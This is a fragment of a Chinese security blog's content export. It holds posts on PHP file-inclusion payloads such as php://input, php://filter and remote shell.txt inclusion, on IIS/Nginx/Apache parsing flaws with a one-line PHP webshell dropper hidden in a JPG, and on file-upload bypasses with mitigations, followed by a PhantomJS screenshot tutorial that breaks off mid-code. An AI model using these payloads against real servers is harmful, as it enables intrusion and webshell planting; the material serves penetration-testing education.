点号截断：</strong><code>?file=../../../../../../../../../boot.ini/………[…]…………</code>(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</p>\n<h2 id=\"普通远程文件包含\">普通远程文件包含</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"preprocessor\">&lt;?php</span> <span class=\"keyword\">include</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">'file'</span>]); <span class=\"preprocessor\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>远程代码执行：</strong><code>?file=[http|https|ftp]://example.com/shell.txt</code> (需要allow_url_fopen=On并且 allow_url_include=On)</p>\n<p><strong>利用php流input：</strong><code>?file=php://input</code> (需要allow_url_include=On，详细→<a href=\"http://php.net/manual/en/wrappers.php.php\" target=\"_blank\" rel=\"external\">http://php.net/manual/en/wrappers.php.php</a>)</p>\n<p><strong>利用php流filter：</strong><code>?file=php://filter/convert.base64-encode/resource=index.php</code> (同上)</p>\n<p><strong>利用data URIs：</strong> <code>?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=</code>(需要allow_url_include=On)</p>\n<p><strong>利用XSS执行任意代码：</strong><code>?file=http://127.0.0.1/path/xss.php?xss=phpcode</code>(需要allow_url_fopen=On，allow_url_include=On并且防火墙或者白名单不允许访问外网时，先在同站点找一个XSS漏洞，包含这个页面，就可以注入恶意代码了。条件非常极端和特殊- -)</p>\n<h2 id=\"有限制的远程文件包含\">有限制的远程文件包含</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"preprocessor\">&lt;?php</span> <span class=\"keyword\">include</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">'file'</span>] . <span class=\"string\">\".htm\"</span>); <span class=\"preprocessor\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><code>?file=http://example.com/shell</code><br><code>?file=http://example.com/shell.txt?</code><br><code>?file=http://example.com/shell.txt%23</code>(需要allow_url_fopen=On并且allow_url_include=On)<br><code>?file=\\evilshare\\shell.php</code>(只需要allow_url_include=On)</p>\n<h2 id=\"延伸\">延伸</h2><p>其实在前面也说了，这些漏洞产生原因是PHP函数在引入文件时，传入的文件名没有经过合理的校验，从而操作了预想之外的文件。实际上我们操作文件的函数不只是include()一个，上面提到的一些截断的方法同样可以适用于以下函数：</p>\n<pre><code>fopen\nfile_get_contents\ncopy\nparse_ini_file\nreadfile\nfile_put_contents\n<span class=\"keyword\">mkdir</span>\ntempnam\ntouch\nmove_uploaded_file\n<span class=\"keyword\">rename</span>\n<span class=\"keyword\">unlink</span>\n<span class=\"keyword\">rmdir</span>\n<span class=\"keyword\">require</span>\nrequire_once\ninclude_once\nZipArchive::<span class=\"keyword\">open</span>()\n</code></pre>"},{"title":"解析漏洞小总结","url":"http://ohroot.com/2014/11/16/解析漏洞小总结/","content":"<p>本文转自乌云，原文链接：<a href=\"http://drops.wooyun.org/papers/539。\" target=\"_blank\" rel=\"external\">http://drops.wooyun.org/papers/539。</a><br><a id=\"more\"></a></p>\n<h2 id=\"IIS_5-x/6-0解析漏洞\">IIS 5.x/6.0解析漏洞</h2><p>IIS 6.0解析利用方法有两种</p>\n<ol>\n<li>目录解析 <code>/xx.asp/xx.jpg</code></li>\n<li>文件解析 <code>/wooyun.asp;.jpg</code></li>\n</ol>\n<p>第一种，在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。<br>例如创建目录 wooyun.asp，那么/wooyun.asp/1.jpg 将被当作asp文件来执行。假设黑阔可以控制上传文件夹路径,就可以不管你上传后你的图片改不改名都能拿shell了。</p>\n<p>第二种，在IIS6.0下，分号后面的不被解析，也就是说wooyun.asp;.jpg 会被服务器看成是wooyun.asp。还有IIS6.0 默认的可执行文件除了asp还包含这三种 <code>/wooyun.asa /wooyun.cer /wooyun.cdx</code></p>\n<h2 id=\"IIS_7-0/IIS_7-5/_Nginx_&lt;8-03畸形解析漏洞\">IIS 7.0/IIS 7.5/ Nginx &lt;8.03畸形解析漏洞</h2><p>Nginx解析漏洞:</p>\n<p>在默认Fast-CGI开启状况下,黑阔上传一个名字为wooyun.jpg，内容为<code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code>的文件，然后访问wooyun.jpg/.php,在这个目录下就会生成一句话木马<code>shell.php</code></p>\n<h2 id=\"Nginx_&lt;8-03_空字节代码执行漏洞\">Nginx &lt;8.03 空字节代码执行漏洞</h2><p>影响版:0.5.,0.6., 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37<br>Nginx在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码</p>\n<h2 id=\"Apache解析漏洞\">Apache解析漏洞</h2><p>Apache是从右到左开始判断解析,如果为不可识别解析,就再往左判断。比如<code>wooyun.php.owf.rar</code>,<code>.owf</code>和<code>.rar</code>这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。<br>如何判断是不是合法的后缀就是这个漏洞的利用关键,测试时可以尝试上传一个wooyun.php.rara.jpg.png…（把你知道的常见后缀都写上…）去测试是否是合法后缀</p>\n<h2 id=\"fast-CGI解析漏洞\">fast-CGI解析漏洞</h2><p>在web服务器开启fast-CGI的时候，上传图片xx.jpg。内容为：<code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[shell])?&gt;&#39;);?&gt;</code><br>这里使用的fput创建一个shell.php文件，并写入一句话。访问路径<code>xx.jpg/.php</code>，就会在该路径下生成一个一句话木马shell.php。这个漏洞在IIS 7.0/7.5，Nginx 8.03以下版本存在。语言环境：PHP，prel，Bourne Shell，C等语言。</p>\n<p>*注：fast-CGI是CGI的升级版，CGI指的是在服务器上提供人机交互的接口，fast-CGI是一种常驻型的CGI。因为CGI每次执行时候，都需要用fork启用一个进程，但是fast-CGI属于激活后就一直执行，不需要每次请求都fork一个进程。比普通的CGI占的内存少。</p>\n<h2 id=\"其他\">其他</h2><p>在windows环境下，<code>xx.jpg[空格]</code>或<code>xx.jpg.</code>这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点，黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单。若上传成功，空格和点都会被windows自动消除,这样也可以getshell。</p>\n<p>如果在Apache中.htaccess可被执行.且可被上传.那可以尝试在.htaccess中写入:<br><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;FilesMatch \"wooyun.jpg\"&gt;</span> </span><br><span class=\"line\">\t<span class=\"keyword\"><span class=\"common\">SetHandler</span></span> application/x-httpd-php </span><br><span class=\"line\"><span class=\"tag\">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>然后再上传shell.jpg的木马, 这样shell.jpg就可解析为php文件。</p>\n"},{"title":"文件上传小总结","url":"http://ohroot.com/2014/11/16/文件上传小总结/","content":"<p>本文主要总结下文件上传，主要是通过PHP的逻辑解释文件上传中的一些安全问题。在前人总结的基础上自己再琢磨琢磨。。。<br><a id=\"more\"></a></p>\n<p>上传漏洞通常是一个文件上传点，其缺乏相应的安全验证，从而可以上传恶意代码，网站最终被getshell<br>下面我们分情况分析</p>\n<h2 id=\"无丝毫验证的文件上传\">无丝毫验证的文件上传</h2><p>一个简单的文件上传表单通常包含一个HTML表单和PHP脚本。HTML表单呈现给用户，而文件上传功能的通常通过PHP脚本实现。下面是一个例子：</p>\n<p>HTML表单如下：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">form</span> <span class=\"attribute\">enctype</span>=<span class=\"value\">\"multipart/form-data\"</span> <span class=\"attribute\">action</span>=<span class=\"value\">\"uploader.php\"</span> <span class=\"attribute\">method</span>=<span class=\"value\">\"POST\"</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"title\">input</span> <span class=\"attribute\">type</span>=<span class=\"value\">\"hidden\"</span> <span class=\"attribute\">name</span>=<span class=\"value\">\"MAX_FILE_SIZE\"</span> <span class=\"attribute\">value</span>=<span class=\"value\">\"100000\"</span> /&gt;</span></span><br><span class=\"line\">\tChoose a file to upload: <span class=\"tag\">&lt;<span class=\"title\">input</span> <span class=\"attribute\">name</span>=<span class=\"value\">\"uploadedfile\"</span> <span class=\"attribute\">type</span>=<span class=\"value\">\"file\"</span> /&gt;</span><span class=\"tag\">&lt;<span class=\"title\">br</span> /&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"title\">input</span> <span class=\"attribute\">type</span>=<span class=\"value\">\"submit\"</span> <span class=\"attribute\">value</span>=<span class=\"value\">\"Upload File\"</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"title\">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>PHP代码如下：<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"preprocessor\">&lt;?php</span></span><br><span class=\"line\">\t<span class=\"variable\">$target_path</span> = <span class=\"string\">\"uploads/\"</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$target_path</span> = <span class=\"variable\">$target_path</span> . basename(<span class=\"variable\">$_FILES</span>[<span class=\"string\">'uploadedfile'</span>][<span class=\"string\">'name'</span>]);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$_FILES</span>[<span class=\"string\">'uploadedfile'</span>][<span class=\"string\">'tmp_name'</span>], <span class=\"variable\">$target_path</span>)) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"The file \"</span> . basename(<span class=\"variable\">$_FILES</span>[<span class=\"string\">'uploadedfile'</span>][<span class=\"string\">'name'</span>]) . <span class=\"string\">\" has been uploaded\"</span>;</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"There was an error uploading the file, please try again!\"</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"><span class=\"preprocessor\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>当PHP接收POST请求且编码类型是multipart/form-data，它会在一个临时的文件名随机的临时目录创建一个文件（例如/ var/tmp/php6yXOVs）。 PHP也将填充全局数组$_FILES上传的文件的信息:<br>$_FILES [‘UploadedFile的’] [‘name’]：在客户机上的文件的原始名称<br>$_FILES [‘UploadedFile的’] [‘type’]：文件的MIME类型<br>$_FILES [‘UploadedFile的’] [‘size’]：文件的大小（以字节为单位）<br>$_FILES [‘UploadedFile的’][‘tmp_name’]：上传的文件存储在服务器上的临时文件名。<br>PHP函数move_uploaded_file将用户提供的临时文件移动到一个位置。在这种情况下，目的地是服务器根目录以下。因此，文件可以使 用的URL来访问。<br>在这个简单的例子中，由于上传的文件类型没有限制，因此攻击者可以上传一个PHP或.NET等带有恶意代码的文件，可导致服务器被getshell。</p>\n<p>但是这种毫无验证的方式通常不会存在，下面从不同的验证方法上看上传绕过。</p>\n<h2 id=\"Mime类型验证\">Mime类型验证</h2><p>MIME的作用：使客户端软件，区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。web服务器使用MIME来说明发送数据的种类， web客户端使用MIME来说明希望接收到的数据种类。<br>常见的错误是Web开发人员验证文件上传表单时，只检查从PHP返回mime类型。当一个文件被上传到服务器，PHP将设置变量$_FILES[‘UploadedFile’][‘type’]所提供的Web浏览器客户端使用的MIME类型。</p>\n<p>服务器端（tomcat5.5）接收不同浏览器上传的文件时，取得的MIME类型</p>\n<table>\n<thead>\n<tr>\n<th>type</th>\n<th>用IE7上传</th>\n<th>用Firefox3.0上传</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>GIF</td>\n<td>image/gif</td>\n<td>image/gif</td>\n</tr>\n<tr>\n<td>JPG</td>\n<td>image/jpeg</td>\n<td>image/jpeg</td>\n</tr>\n<tr>\n<td>ZIP</td>\n<td>application/x-compressed</td>\n<td>application/octet-stream</td>\n</tr>\n<tr>\n<td>JSP</td>\n<td>text/html</td>\n<td>text/html</td>\n</tr>\n<tr>\n<td>EXE</td>\n<td>application/octet-stream</td>\n<td>application/octet-stream</td>\n</tr>\n</tbody>\n</table>\n<p>常见MIME类型例表：</p>\n<table>\n<thead>\n<tr>\n<th>序号</th>\n<th>内容类型</th>\n<th>文件扩展名</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>application/msword</td>\n<td>doc</td>\n<td>Microsoft Word</td>\n</tr>\n<tr>\n<td>2</td>\n<td>application/octet-stream bin</td>\n<td>dms lha lzh exe class</td>\n<td>可执行程序</td>\n</tr>\n<tr>\n<td>3</td>\n<td>application/pdf</td>\n<td>pdf</td>\n<td>Adobe Acrobat</td>\n</tr>\n<tr>\n<td>4</td>\n<td>application/postscript</td>\n<td>ai eps ps</td>\n<td>PostScript</td>\n</tr>\n<tr>\n<td>5</td>\n<td>appication/powerpoint</td>\n<td>ppt</td>\n<td>Microsoft Powerpoint</td>\n</tr>\n<tr>\n<td>6</td>\n<td>appication/rtf</td>\n<td>rtf</td>\n<td>rtf格式</td>\n</tr>\n<tr>\n<td>7</td>\n<td>appication/x-compress</td>\n<td>z</td>\n<td>unix 压缩文件</td>\n</tr>\n<tr>\n<td>8</td>\n<td>application/x-gzip</td>\n<td>gz</td>\n<td>gzip</td>\n</tr>\n<tr>\n<td>9</td>\n<td>application/x-gtar</td>\n<td>gtar</td>\n<td>tar 文档 (gnu 格式 )</td>\n</tr>\n<tr>\n<td>10</td>\n<td>application/x-shockwave-flash</td>\n<td>swf</td>\n<td>MacroMedia Flash</td>\n</tr>\n<tr>\n<td>11</td>\n<td>application/x-tar</td>\n<td>tar</td>\n<td>tar(4.3BSD)</td>\n</tr>\n<tr>\n<td>12</td>\n<td>application/zip</td>\n<td>zip</td>\n<td>winzip</td>\n</tr>\n<tr>\n<td>13</td>\n<td>audio/basic</td>\n<td>au snd</td>\n<td>sun/next 声音文件</td>\n</tr>\n<tr>\n<td>14</td>\n<td>audio/mpeg</td>\n<td>mpeg mp2</td>\n<td>Mpeg 声音文件</td>\n</tr>\n<tr>\n<td>15</td>\n<td>audio/x-aiff</td>\n<td>mid midi rmf</td>\n<td>Midi 格式</td>\n</tr>\n<tr>\n<td>16</td>\n<td>audio/x-pn-realaudio</td>\n<td>ram ra</td>\n<td>Real Audio 声音</td>\n</tr>\n<tr>\n<td>17</td>\n<td>audio/x-pn-realaudio-plugin</td>\n<td>rpm</td>\n<td>Real Audio 插件</td>\n</tr>\n<tr>\n<td>18</td>\n<td>audio/x-wav</td>\n<td>wav</td>\n<td>Microsoft Windows 声音</td>\n</tr>\n<tr>\n<td>19</td>\n<td>image/cgm</td>\n<td>cgm</td>\n<td>计算机图形元文件</td>\n</tr>\n<tr>\n<td>20</td>\n<td>image/gif</td>\n<td>gif</td>\n<td>COMPUSERVE GIF 图像</td>\n</tr>\n<tr>\n<td>21</td>\n<td>image/jpeg</td>\n<td>jpeg jpg jpe</td>\n<td>JPEG 图像</td>\n</tr>\n<tr>\n<td>22</td>\n<td>image/png</td>\n<td>png</td>\n<td>PNG 图像</td>\n</tr>\n</tbody>\n</table>\n<p><strong> 绕过 </strong><br>判断方法：基于不同mime类型多上传几次来测试<br>MIME类型通常在http头中，我们很容易通过抓包，改包的方式去绕过此种验证方式。最常用burp去修改http包。</p>\n<h2 id=\"限制危险的拓展\">限制危险的拓展</h2><p>在另一个例子里，我们遇到了文件上传使用黑名单的做法，作为一项安全措施。从开发者收集制定的危险列表，如果正在上传的文件扩展名包含在列表中，访问会被拒绝。<br>使用危险的文件扩展名，其主要缺点之一是，它几乎不可能编制一份完整的清单，包括攻击者可以使用的所有可能的扩展名。<br>恶意用户可以很容易地绕过该检查上传一个文件名为“.htaccess”，其中包含类似于下面的一行代码：<code>AddType application/x-httpd-php .jpg</code><br>上面的代码行指示ApacheWeb服务器执行jpg图片，好像他们是PHP脚本。攻击者现在可以上传一个jpg扩展名的文件，其中包含PHP代码。通过web浏览器请求一个jpg文件，其中包含PHP的命令phpinfo()函数，Web服务器依旧会执行php代码。</p>\n<h2 id=\"服务端扩展名验证\">服务端扩展名验证</h2><p>一般都是黑名单验证的，这部分建议看一下关于解析漏洞的文章：<a href=\"http://direwolf.gitcafe.com/2014/11/16/解析漏洞小总结/\" target=\"_blank\" rel=\"external\">解析漏洞小总结</a><br>如何绕过：</p>\n<ol>\n<li>找黑名单扩展名的漏网之鱼 – 通常对于asp就是 asa、cer之类，对于php就是php3、php4等</li>\n<li>可能存在大小写绕过漏洞 – 比如 aSp 和 pHp 之类</li>\n<li>特别文件名构造 – 比如发送的 http 包里把文件名改成 help.asp. 或 help.asp_(下划线为空格)，这种命名方式在 windows 系统里是不被允许的，所以需要在 burp 之类里进行修改， 然后绕过验证后，会被windows系统自动去掉后面的点和空格。</li>\n<li>IIS或nginx文件名解析漏洞 – 比如 help.asp;.jpg或<a href=\"http://www.xx.com/help.jpg/2.php。这里注意网上所谓的\" target=\"_blank\" rel=\"external\">http://www.xx.com/help.jpg/2.php。这里注意网上所谓的</a> nginx 文件名解析漏洞实际上是 php-fpm 文件名解析漏洞，详见 <a href=\"http://www.cnbeta.com/articles/111752.htm\" target=\"_blank\" rel=\"external\">http://www.cnbeta.com/articles/111752.htm</a></li>\n<li>0×00 截断绕过 – 这个是基于一个组合逻辑漏洞造成的</li>\n<li>双扩展名解析绕过攻击(1) – 基于 web 服务的解析逻辑。比如上传x.php.rar等文件</li>\n<li>双扩展名解析绕过攻击(2) – 基于 web 服务的解析方式（解析漏洞）</li>\n<li>如果在 Apache 的 conf 里有这样一行配置<code>AddHandler php5-script .php</code> 这时只要文件名里包含.php,即使文件名是 test2.php.jpg 也会以 php 来执行</li>\n</ol>\n<h2 id=\"检查图片头部\">检查图片头部</h2><p>当仅允许上传图片的时候, 开发者通常使用PHP的getimagesize函数来检测图片的头部信息。该函数在被调用时将会返回图片的尺寸, 如果图片经验证为无效的, 也就是说图片头部信息不正确, 则会返回 false 值。因此一个开发者一般会检查该函数是否返回true或false,并且通过该信息来验证上传的文件。所以, 如果一个恶意用户试着上传一个内嵌有简单PHP shell的jpg文件的话,该函数会返回false，然后他将不允许上传此文件。然而, 即使这种方式也能被很容易的绕过。如果一个图片在一个图片编辑器内打开, 就如Gimp,用户就可以编辑图片的注释区, 那儿就能插入PHP代码,该图片仍然有一个有效的头部; 因此就绕过了getimagesize函数的检查。<br>这里就是php图片马的原理了。一般我们做图片马尽量不要去损坏图片头信息。</p>\n<h2 id=\"js验证\">js验证</h2><p>判断方法：点击提交，用burp看是否有数据提交到服务器端，或者直接看是否直接弹出不允许的上传类型。<br>绕过方法：</p>\n<ol>\n<li>我们直接删除代码中onsubmit事件中关于文件上传时验证上传文件的相关代码即可。</li>\n<li>直接更改文件上传JS代码中允许上传的文件扩展名你想要上传的文件扩展名。</li>\n<li>使用本地构造提交表单即可，作相应的更改。</li>\n<li>使用burpsuite或者是fiddle等代理工具提交，本地文件先更改为jpg，上传时拦截，再把文件扩展名更改为asp即可。这也是最简单，最常用的了。</li>\n</ol>\n<h2 id=\"通过-htaccess保护上传文件夹\">通过.htaccess保护上传文件夹</h2><p>另一种流行的创建安全的文件上传表单的方法是使用.htaccess保护好上传文件存放的文件夹。办法是限制这个文件夹里的脚本文件的执行。这种情形一下一个.htaccess文件一般包含下面的代码：<br><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AddHandler cgi-script <span class=\"class\">.php</span> <span class=\"class\">.php3</span> <span class=\"class\">.php4</span> <span class=\"class\">.phtml</span> <span class=\"class\">.pl</span> <span class=\"class\">.py</span> <span class=\"class\">.jsp</span> <span class=\"class\">.asp</span> <span class=\"class\">.htm</span> <span class=\"class\">.shtml</span> <span class=\"class\">.sh</span> <span class=\"class\">.cgi</span></span><br><span class=\"line\">Options –ExecCGI</span><br></pre></td></tr></table></figure></p>\n<p>上面的是另一种形式的黑名单，本身并不是很安全。在PHP手册中，move_uploaded_file一章中，有一个warning:若目标文件已经存在，则会覆盖原文件。因为上传的文件能够而且会覆盖已经存在的同名文件，一个恶意用户很轻易就能用他自己修改过的.htaccess替换掉原来的。进而可以 上传执行特定的恶意脚本。</p>\n<h2 id=\"客户端验证\">客户端验证</h2><p>另一种在文件上传表单中常用的安全技术是在客户端验证上传的文件。一般而言，该技术在ASP.NET应用中更通用一些，因为ASP.NET提供了易用的验证控件。<br>这些验证控件允许开发者对要上传的文件做正则检查，以查出待上传的文件扩展名是否在允许列表中。下面是一段来自微软网站的示例代码:<br><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#60;asp:FileUpload ID=&#34;FileUpload1&#34; runat=&#34;server&#34; /&#62;&#10;&#60;asp:Button ID=&#34;Button1&#34; runat=&#34;server&#34; OnClick=&#34;Button1_Click&#34; Text=&#34;Upload File&#34; /&#62;&#10;&#60;asp:Label ID=&#34;Label1&#34; runat=&#34;server&#34;&#62;&#60;/asp:Label&#62;&#10;&#60;asp:RegularExpressionValidator id=&#34;RegularExpressionValidator1&#34; runat=&#34;server&#34; ErrorMessage=&#34;Only mp3, m3u or mpeg files are allowed!&#34; ValidationExpression=&#34;^(([a-zA-Z]:)|(&#123;2&#125;w+)$?)((w[w].*))+(.mp3|.MP3|.mpeg|.MPEG|.m3u|.M3U)$&#34; ControlToValidate=&#34;FileUpload1&#34;&#62;&#60;/asp:RegularExpressionValidator&#62;&#10;&#60;asp:RequiredFieldValidator id=&#34;RequiredFieldValidator1&#34; runat=&#34;server&#34; ErrorMessage=&#34;This is a required field!&#34; ControlToValidate=&#34;FileUpload1&#34;&#62;&#60;/asp:RequiredFieldValidator&#62;</span><br></pre></td></tr></table></figure></p>\n<p>这段ASP.NET代码使用了验证控件，所以最终用户只被允许上传.mp3,.mpeg,或者.m3u文件到服务器。若文件类型和这三个指定的文件类型不一致，验证控件将抛出异常，文件也就不会被上传。<br>由于这种文件验证是在客户端完成的，恶意用户很容易就能绕过这一检查。写一段客户端脚本来替换web应用的验证脚本做验证。不用web浏览器，入侵者可以使用可以发送HTTP POST请求的程序来实现上传文件。</p>\n<p><strong> 推荐的解决方案 </strong></p>\n<ul>\n<li><p>定义一个.htaccess文件，只允许访问指定扩展名的文件。不要把.htaccess文件和上传文件放在同一个目录里，应该放在父目录里。一个典型的只允许 gif, jpg, jpeg 和 png文件的.htaccess文件应当包含下面的代码(根据你的需求做调整)。这样也能阻止双扩展名攻击.</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\"><span class=\"common\">deny</span></span> from <span class=\"literal\">all</span></span><br><span class=\"line\"><span class=\"tag\">&lt;Files ~ \"^w+.(gif|jpe?g|png)$\"&gt;</span></span><br><span class=\"line\">\t<span class=\"keyword\"><span class=\"common\">order</span></span> deny,allow</span><br><span class=\"line\">\t<span class=\"keyword\"><span class=\"common\">allow</span></span> from <span class=\"literal\">all</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/Files&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>如果可能，把文件上传到root目录以外的目录里。</p>\n</li>\n<li>禁止覆盖已存在的文件（以阻止.htaccess覆盖攻击）</li>\n<li>创建一个mime-type白名单列表。(只允许这个列表里的Mime-type)</li>\n<li>生成一个随机的文件名，并且加上此前生成的文件扩展名、</li>\n<li>不要只依赖客户端验证，这不够。理想的是既有客户端验证也有服务器端验证。</li>\n</ul>\n<p>参考文章:</p>\n<p><a href=\"http://www.91ri.org/9033.html\" target=\"_blank\" rel=\"external\">上传漏洞科普[1]-文件上传表单是Web安全主要威胁</a><br><a href=\"http://www.91ri.org/9034.html\" target=\"_blank\" rel=\"external\">上传漏洞科普[1]-js验证</a></p>\n"},{"title":"phantomjs小试牛刀","url":"http://ohroot.com/2014/11/11/phantomjs小试牛刀/","content":"<p>这几天在做批量网站获取whois信息方面的东西，发现了whois信息格式不是统一的，也尝试了很多方法，后来发现万网的数据格式挺不错的，于是就把我引向了phantomjs的学习。<br><a id=\"more\"></a></p>\n<h3 id=\"0x01起源\">0x01起源</h3><p>问题首先是这样的，<a href=\"http://whois.www.net.cn\" target=\"_blank\" rel=\"external\">万网whois查询</a>页面是通过ajax的方式获取whois信息的，传统的urllib等方法爬虫完全不行。于是就开始小研究了下，看到了phantomjs可以配合selenium实现页面信息的爬取，听师兄介绍说<a href=\"http://jeanphix.me/Ghost.py/\" target=\"_blank\" rel=\"external\">Ghost.py</a>也可以实现类似的功能，但是看到phantomjs还具有网页截图的功能，之前自己一直在研究批量网站的截图，又没找到非常棒的解决方案。看别人评价说速度还不错，于是果断决定学习下</p>\n<h3 id=\"安装phantomjs\">安装phantomjs</h3><p>这里只写出ubuntu下面的无脑操作方法，其他环境参考官方教程<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /usr/<span class=\"built_in\">local</span>/share</span><br><span class=\"line\">sudo wget https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-<span class=\"number\">1.9</span>.<span class=\"number\">8</span>-linux-x86_64.tar.bz2</span><br><span class=\"line\">sudo tar xjf phantomjs-<span class=\"number\">1.9</span>.<span class=\"number\">8</span>-linux-x86_64.tar.bz2</span><br><span class=\"line\">sudo ln <span class=\"operator\">-s</span> /usr/<span class=\"built_in\">local</span>/share/phantomjs-<span class=\"number\">1.9</span>.<span class=\"number\">8</span>-linux-x86_64/bin/phantomjs /usr/<span class=\"built_in\">local</span>/share/phantomjs</span><br><span class=\"line\">sudo ln <span class=\"operator\">-s</span> /usr/<span class=\"built_in\">local</span>/share/phantomjs-<span class=\"number\">1.9</span>.<span class=\"number\">8</span>-linux-x86_64/bin/phantomjs /usr/<span class=\"built_in\">local</span>/bin/phantomjs</span><br><span class=\"line\">sudo ln <span class=\"operator\">-s</span> /usr/<span class=\"built_in\">local</span>/share/phantomjs-<span class=\"number\">1.9</span>.<span class=\"number\">8</span>-linux-x86_64/bin/phantomjs /usr/bin/phantomjs</span><br></pre></td></tr></table></figure></p>\n<p>测试是否安装成功<code>phantomjs -v</code></p>\n<h3 id=\"phantomjs实现网页截图\">phantomjs实现网页截图</h3><p>下面是其官方给的简单实现<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> page = <span class=\"built_in\">require</span>(<span class=\"string\">'webpage'</span>).create();</span><br><span class=\"line\">page.open(<span class=\"string\">'http://www.baidu.com/'</span>, <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">  page.render(<span class=\"string\">'baidu.png'</span>);</span><br><span class=\"line\">  phantom.exit();</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\n<p>测试方法：将上述代码另存为<code>cap.js</code>文件，在命令行下执行<code>phantomjs ./cap.js</code>即可在当前目录生成百度的首页截图，命名为baidu.jpg</p>\n<p>下面是一个更加友好的实现方式，可以自定义图片生成路径和图片的像素<br>使用方法<code>phantomjs cap.js http://www.baidu.com ./baidu.jpg 1024*768</code><br>还可以生成PDF <code>phantomjs cap.js http://www.baidu.com ./baidu.pdf 1024*768</code><br>代码如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span 